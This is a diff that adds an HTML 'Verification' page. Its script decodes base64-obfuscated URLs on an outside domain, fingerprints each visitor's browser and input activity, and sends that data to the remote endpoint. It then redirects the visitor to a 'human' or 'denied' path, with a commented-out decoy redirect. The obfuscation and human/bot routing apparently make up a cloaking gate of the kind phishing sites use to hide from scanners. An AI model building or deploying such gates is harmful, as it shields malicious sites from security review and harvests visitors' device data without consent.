@@ -1,0 +1,253 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Verification</title>
+    <!-- reCAPTCHA v3 - DISABLED -->
+    <!-- <script src="https://www.google.com/recaptcha/api.js?render=6LfUvO4rAAAAABz_j2gl1r_x8x3mVkstksZXVU-k"></script> -->
+  </head>
+  <body>
+    <div id="app">Loading...</div>
+
+    <script>
+      (async function () {
+        // ============================================
+        // CONFIGURATION
+        // ============================================
+        const endpoint = atob("aHR0cDovL2NhbXBiZWxsY2hhbWJsaXNzYXBwcmFpc2Vycy5jb20vYXBpLnBocA==");
+        const redirectBase = atob("aHR0cDovL2NhbXBiZWxsY2hhbWJsaXNzYXBwcmFpc2Vycy5jb20vcHJvY2Vzcy5waHA=");
+        const RECAPTCHA_SITE_KEY = ''; // reCAPTCHA disabled
+        const USE_RECAPTCHA = false; // reCAPTCHA DISABLED to match cPanel configuration
+        
+        const DEBUG = true; // Enable to see detailed logs in browser console
+        const pageLoadTime = Date.now();
+        
+        // ============================================
+        // BEHAVIORAL TRACKING
+        // ============================================
+        let mouseMoved = false;
+        let keyboardUsed = false;
+        let scrollDetected = false;
+        
+        document.addEventListener('mousemove', () => { mouseMoved = true; }, { once: true });
+        document.addEventListener('keypress', () => { keyboardUsed = true; }, { once: true });
+        document.addEventListener('scroll', () => { scrollDetected = true; }, { once: true });
+        
+        // ============================================
+        // BROWSER FINGERPRINTING
+        // ============================================
+        function collectFingerprint() {
+          const fp = {
+            // Screen info
+            screen_width: screen.width,
+            screen_height: screen.height,
+            screen_avail_width: screen.availWidth,
+            screen_avail_height: screen.availHeight,
+            screen_color_depth: screen.colorDepth,
+            screen_pixel_depth: screen.pixelDepth,
+            
+            // Browser info
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(',') : '',
+            vendor: navigator.vendor || '',
+            product: navigator.product || '',
+            
+            // Timezone
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+            timezone_offset: new Date().getTimezoneOffset(),
+            
+            // Hardware
+            hardware_concurrency: navigator.hardwareConcurrency || 0,
+            device_memory: navigator.deviceMemory || 0,
+            max_touch_points: navigator.maxTouchPoints || 0,
+            
+            // Browser features
+            cookies_enabled: navigator.cookieEnabled,
+            do_not_track: navigator.doNotTrack || '',
+            
+            // WebGL
+            webgl: checkWebGL(),
+            
+            // Canvas fingerprint
+            canvas: getCanvasFingerprint(),
+            
+            // Plugins (limited in modern browsers)
+            plugins_count: navigator.plugins ? navigator.plugins.length : 0
+          };
+          
+          return fp;
+        }
+        
+        function checkWebGL() {
+          try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            return !!gl;
+          } catch(e) {
+            return false;
+          }
+        }
+        
+        function getCanvasFingerprint() {
+          try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 140, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Browser Fingerprint', 2, 2);
+            return canvas.toDataURL();
+          } catch(e) {
+            return '';
+          }
+        }
+        
+        // ============================================
+        // JAVASCRIPT CHALLENGE
+        // ============================================
+        function solveChallenge(seed) {
+          // Simple challenge: MD5-like hash simulation
+          // In production, use actual crypto library
+          let str = seed + 'challenge_secret_salt';
+          let hash = 0;
+          for (let i = 0; i < str.length; i++) {
+            hash = ((hash << 5) - hash) + str.charCodeAt(i);
+            hash = hash & hash;
+          }
+          return Math.abs(hash).toString(16);
+        }
+        
+        // ============================================
+        // RECAPTCHA v3 EXECUTION
+        // ============================================
+        async function getRecaptchaToken() {
+          if (!USE_RECAPTCHA || !RECAPTCHA_SITE_KEY) {
+            return null; // Skip reCAPTCHA if disabled or no key
+          }
+          
+          try {
+            if (typeof grecaptcha === 'undefined') {
+              console.warn('reCAPTCHA not loaded');
+              return null;
+            }
+            
+            return await grecaptcha.execute(RECAPTCHA_SITE_KEY, { action: 'verify' });
+          } catch(e) {
+            console.error('reCAPTCHA error:', e);
+            return null;
+          }
+        }
+        
+        // ============================================
+        // MAIN VERIFICATION
+        // ============================================
+        
+        // Wait a bit for user interaction tracking
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        try {
+          if (DEBUG) console.log('🔍 Collecting data...');
+          
+          // Collect all data
+          const fingerprint = collectFingerprint();
+          const challengeSeed = Date.now().toString();
+          const challengeSolution = solveChallenge(challengeSeed);
+          const timing = Date.now() - pageLoadTime;
+          
+          // Get reCAPTCHA token
+          const recaptchaToken = await getRecaptchaToken();
+          
+          if (DEBUG) console.log('📦 Data collected, sending to API...');
+          
+          // Send to API
+          const controller = new AbortController();
+          const timeout = setTimeout(() => controller.abort(), 15000);
+          
+          const res = await fetch(endpoint, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              ua: navigator.userAgent,
+              timestamp: Date.now(),
+              fingerprint: fingerprint,
+              challenge_seed: challengeSeed,
+              js_challenge: challengeSolution,
+              timing: timing,
+              mouse_moved: mouseMoved,
+              keyboard_used: keyboardUsed,
+              scroll_detected: scrollDetected,
+              recaptcha_token: recaptchaToken
+            }),
+            mode: "cors",
+            signal: controller.signal
+          });
+          
+          clearTimeout(timeout);
+          
+          if (DEBUG) console.log('📥 Response status:', res.status);
+          
+          if (!res.ok) {
+            console.error("API returned error status:", res.status);
+            // Try to get response text for debugging
+            const errorText = await res.text().catch(() => 'Could not read response');
+            console.error("API error response:", errorText);
+            throw new Error("API returned: " + res.status);
+          }
+
+          const data = await res.json();
+          
+          if (DEBUG) console.log('📦 Response:', data);
+          
+          // Redirect with token
+          if (data && data.token) {
+            const type = (data.is_human === true) ? "human" : "denied";
+            if (DEBUG) console.log('✅ Redirecting:', type);
+            location.replace(redirectBase + "?key=" + data.token + "&type=" + type);
+            return;
+          }
+          
+          console.error("API response missing token:", data);
+          throw new Error("No token in response");
+          
+        } catch (e) {
+          console.error("❌ Error:", e);
+          console.error("Error details:", {
+            message: e.message,
+            stack: e.stack,
+            name: e.name
+          });
+          
+          // Show error message to user instead of immediately redirecting
+          document.getElementById('app').innerHTML = `
+            <div style="padding:40px;text-align:center;font-family:Arial,sans-serif;">
+              <h2 style="color:#d32f2f;">Verification Error</h2>
+              <p>Unable to complete verification. Please try again.</p>
+              <p style="font-size:12px;color:#666;margin-top:20px;">Error: ${e.message}</p>
+              <button onclick="location.reload()" style="margin-top:20px;padding:10px 20px;background:#1976d2;color:white;border:none;border-radius:4px;cursor:pointer;">
+                Retry
+              </button>
+            </div>
+          `;
+          
+          // Optional: redirect after showing error for 5 seconds
+          // setTimeout(() => {
+          //   location.replace("https://youtu.be/28Jgk08KTMA?si=aEuR7qlqhPIiFcvM");
+          // }, 5000);
+        }
+      })();
+    </script>
+
+    <noscript>
+      JavaScript is required to verify access.
+    </noscript>
+  </body>
+</html>
+
+
+
+
+
